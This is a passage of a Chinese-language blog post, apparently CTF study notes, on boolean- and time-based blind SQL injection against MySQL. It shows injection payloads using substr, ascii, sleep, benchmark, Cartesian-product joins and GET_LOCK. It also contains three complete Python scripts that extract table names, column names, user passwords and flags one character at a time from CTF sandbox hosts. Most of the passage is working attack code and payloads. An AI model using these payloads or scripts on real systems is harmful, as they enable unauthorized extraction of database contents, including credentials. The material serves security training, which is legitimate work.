<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">left</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ascii</span>()、<span style="color:#58a1dd">substr</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">regexp</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ord</span>()、<span style="color:#58a1dd">mid</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">id</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39;and left((select database() limit 0,1),1)=&#39;</span><span style="color:#58a1dd">s</span><span style="color:#a6be9d">&#39;#</span></span></span></code></pre></div><h2 id="布尔" class="heading-element"><span>布尔</span>
  <a href="#%e5%b8%83%e5%b0%94" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>漏洞验证</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">&#39; or  length(database())&gt;1#</span></span></span></code></pre></div><p>攻击</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#ff636f">select</span> <span style="color:#58a1dd">xxx</span>,<span style="color:#58a1dd">x</span>,<span style="color:#a6be9d">1</span>))<span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">x</span>,<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mid</span>(<span style="color:#ff636f">select</span> ,<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>)<span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;z&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">left</span>((<span style="color:#ff636f">select</span> <span style="color:#ff636f">database</span>() <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>),<span style="color:#a6be9d">1</span>)<span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;s&#39;</span><span style="color:#ff636f">#</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ORD</span>(<span style="color:#58a1dd">mid</span>(<span style="color:#ff636f">database</span>(),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>)) <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">100</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">xxx</span> <span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;user&#39;</span> 
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xxxx</span> <span style="color:#58a1dd">regexp</span> <span style="color:#a6be9d">&#39;^us[a-z]&#39;</span></span></span></code></pre></div><p>脚本处理</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;http://challenge-76d8ef356dbd48f7.sandbox.ctfhub.com:10800/&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">flag</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">127</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">25</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#58a1dd">mid</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">min</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{}),1,0)&#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),{},1))&gt;{}),1,0)&#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;if((ascii(substr(right((select group_concat(flag) from flag),10),</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">,1))&gt;</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">),1,0)&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">i</span>,<span style="color:#58a1dd">mid</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34; or if((ascii(substr((select group_concat(password) from users),{},1))&gt;{}),1,0)# &#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">params</span><span style="color:#ff636f">=</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#39;id&#39;</span>:<span style="color:#58a1dd">payload</span>
</span></span><span style="display:flex;"><span>             }
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">res</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">url</span>,<span style="color:#58a1dd">params</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">params</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#39;query_success&#39;</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">res</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">mid</span>
</span></span><span style="display:flex;"><span>              <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">mid</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">flag</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">mid</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">flag</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">127</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">flag</span>)</span></span></code></pre></div><h2 id="时间" class="heading-element"><span>时间</span>
  <a href="#%e6%97%b6%e9%97%b4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>验证</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">&#39; and sleep(3)#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">benchmark(50000000,encode(&#39;</span><span style="color:#58a1dd">msg</span><span style="color:#a6be9d">&#39;,&#39;</span><span style="color:#ff636f">key</span><span style="color:#a6be9d">&#39;)) //运行encode(&#39;</span><span style="color:#58a1dd">msg</span><span style="color:#a6be9d">&#39;,&#39;</span><span style="color:#ff636f">key</span><span style="color:#a6be9d">&#39;)操作50000000 次，会占用一段时间。</span></span></span></code></pre></div><p>攻击</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6be9d">1.</span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">ascii</span>(<span style="color:#58a1dd">substr</span>(<span style="color:#58a1dd">select</span> <span style="color:#58a1dd">xxx</span>,<span style="color:#58a1dd">x</span>,<span style="color:#a6be9d">1</span>))<span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">x</span>,<span style="color:#58a1dd">sleep</span>(<span style="color:#a6be9d">2</span>),<span style="color:#a6be9d">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2.</span><span style="color:#58a1dd">sleep</span>(<span style="color:#ff636f">if</span>((<span style="color:#58a1dd">lengrh</span>(<span style="color:#58a1dd">database</span>())<span style="color:#ff636f">&gt;</span><span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">5</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3.</span><span style="color:#58a1dd">sleep</span>(<span style="color:#ff636f">if</span>((<span style="color:#58a1dd">ORD</span>(<span style="color:#58a1dd">mid</span>(<span style="color:#58a1dd">database</span>(),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>)) <span style="color:#ff636f">=</span><span style="color:#a6be9d">115</span> ),<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">5</span>))<span style="color:#ff636f">--+</span></span></span></code></pre></div><p>脚本处理</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">times</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">time</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">time</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">res</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">url</span>, <span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">data</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">time</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">time</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">times</span> <span style="color:#ff636f">&gt;=</span> <span style="color:#a6be9d">2</span>:
</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">flag</span><span style="color:#ff636f">+=...</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">time</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;http://challenge-246727d4e05c9be7.sandbox.ctfhub.com:10800/&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">flag</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">127</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">25</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#58a1dd">mid</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">min</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">,1))&gt;</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">),sleep(2),0)&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">i</span>,<span style="color:#58a1dd">mid</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),{},1))&gt;{}),1,0)&#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34;if((ascii(substr(right((select group_concat(flag) from flag),10),{},1))&gt;{}),1,0)&#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">#payload=&#34; or if((ascii(substr((select group_concat(password) from users),{},1))&gt;{}),1,0)# &#34;.format(i,mid)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">params</span><span style="color:#ff636f">=</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#39;id&#39;</span>:<span style="color:#58a1dd">payload</span>
</span></span><span style="display:flex;"><span>             }
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">times</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">time</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">time</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">res</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">url</span>,<span style="color:#58a1dd">params</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">params</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#58a1dd">time</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">time</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">times</span> <span style="color:#ff636f">&gt;=</span> <span style="color:#a6be9d">2</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">mid</span>
</span></span><span style="display:flex;"><span>              <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">mid</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">flag</span><span style="color:#ff636f">+=</span><span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">mid</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">flag</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">min</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">max</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">127</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">mid</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">int</span>((<span style="color:#58a1dd">min</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">max</span>)<span style="color:#ff636f">/</span><span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">flag</span>)</span></span></code></pre></div><hr>
<p><a href="https://www.cnblogs.com/forforever/p/13019703.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/forforever/p/13019703.html</a></p>
<h3 id="sleep" class="heading-element"><span>sleep()</span>
  <a href="#sleep" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>sleep(x)
select sleep(5);</code></pre><h3 id="benchmarktexp" class="heading-element"><span>benchmark(t,exp)</span>
  <a href="#benchmarktexp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>重复执行某表达式</p>
<pre tabindex="0"><code> benchmark(t,exp)
     select benchmark(count,expr),是重复执行count次expr表达式，使得处理时间很长，来产生延迟，
     比如select benchmark(1000000,encode(&#34;hello&#34;,&#34;good&#34;));
     select benchmark( 5000000, md5( &#39;test&#39; ));</code></pre><h3 id="笛卡尔积" class="heading-element"><span>笛卡尔积</span>
  <a href="#%e7%ac%9b%e5%8d%a1%e5%b0%94%e7%a7%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code> 笛卡尔积(因为连接表是一个很耗时的操作)
     AxB=A和B中每个元素的组合所组成的集合，就是连接表
     SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
     select * from table_name A, table_name B
     select * from table_name A, table_name B，table_name C
     select count(*) from table_name A, table_name B，table_name C  表可以是同一张表</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># sql = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34; #Flllag</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># sql = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;Flllag&#39; and table_schema=database()&#34; #Flagg</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sql</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;select group_concat(Flagg) from Flllag&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">j</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">36</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">flag</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;flag{h3Ltx545LiDwpjQ8Ij1x241wIxS4fa&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">while</span> <span style="color:#ff636f">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">32</span>, <span style="color:#a6be9d">128</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">burp0_url</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;http://web-bd1bbd084b.challenge.xctf.org.cn/index.php?id=1&#39;||case+when(ascii(substr((</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">),</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">,1))=</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">)then(select sum(&#39;1&#39;)from information_schema.tables A,information_schema.columns B,information_schema.columns C)end-- &#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">sql</span>, <span style="color:#58a1dd">j</span>, <span style="color:#58a1dd">i</span>)<span style="color:#828b96;font-style:italic">#case代替if</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">print</span> <span style="color:#58a1dd">burp0_url</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">burp0_url</span>, <span style="color:#58a1dd">timeout</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">127</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">j</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">i</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">print</span> <span style="color:#58a1dd">flag</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">j</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">j</span> <span style="color:#ff636f">==</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">print</span> <span style="color:#58a1dd">flag</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">exit</span>(<span style="color:#a6be9d">0</span>)</span></span></code></pre></div><h3 id="get_lock" class="heading-element"><span>GET_LOCK()</span>
  <a href="#get_lock" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>GET_LOCK(key,timeout) 需要两个连接会话
RELEASE_LOCK(key) 锁是否释放，释放了返回1
